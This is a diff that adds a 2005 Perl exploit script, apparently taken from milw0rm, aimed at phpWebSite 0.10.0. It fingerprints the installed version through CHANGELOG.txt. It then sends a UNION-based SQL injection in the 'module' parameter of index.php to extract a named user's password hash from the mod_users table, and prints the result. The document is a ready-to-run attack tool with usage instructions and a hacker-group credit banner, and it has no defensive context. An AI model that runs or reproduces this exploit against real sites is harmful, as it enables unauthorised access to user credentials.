@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+use LWP::Simple;
+ 
+$serv     =  $ARGV[0]; 
+$path     =  $ARGV[1]; 
+$name     =  $ARGV[2];
+    
+sub usage
+ { 
+    print "\nUsage: $0 [server] [path] [username] \n"; 
+    print "sever    -  URL\n"; 
+    print "path     -  path to index.php\n"; 
+    print "username -  name register user\n\n"; 
+    exit ();}  
+ 
+sub work
+ {
+    print qq(
+       --------------------------------- 
+#==---[    phpWebSite SQL-injection     |
+#==---[   tested ob phpWebSite-0.10.0   |
+#==---[  Gr33tz: blf, 1dt.w0lf, Pengo,  |
+#==---[       edisan, foster, whice     |
+#==---[ (c)oded by x97Rang 2005 RST/GHC |
+#==---[        http://rst.void.ru       |
+#==---[          http://ghc.ru          |
+       ---------------------------------\n\n);&chv;&board}
+       
+sub chv     
+ {
+    $ver  = sprintf("http://%s%s/docs/CHANGELOG.txt",$serv,$path);
+    $getv = get "$ver";
+if ($getv =~ /(phpWebSite-)(\d{1})\.(\d{1,2})\.(\d{1})/){print"[*] Version: $1$2.$3.$4\n";}}  
+ 
+sub board 
+ {
+    $URL = sprintf("http://%s%s/index.php?module=%27+union+select+username,password+from+mod_users+where+username=%27$name%27/*",$serv,$path);   
+    $content = get "$URL";
+if ($content =~ /(\<b\>Search\&\#160\;)(\w{32})(\<\/b\>)/){&showh;}else{print "... One of those days :)\n";}}
+ 
+sub showh
+ {
+    print "[*] User: $name\n";
+    print "[*] Hash: $2\n\n";}
+    
+if (@ARGV != 3){&usage;}else{&work;}
+
+# milw0rm.com [2005-09-15]
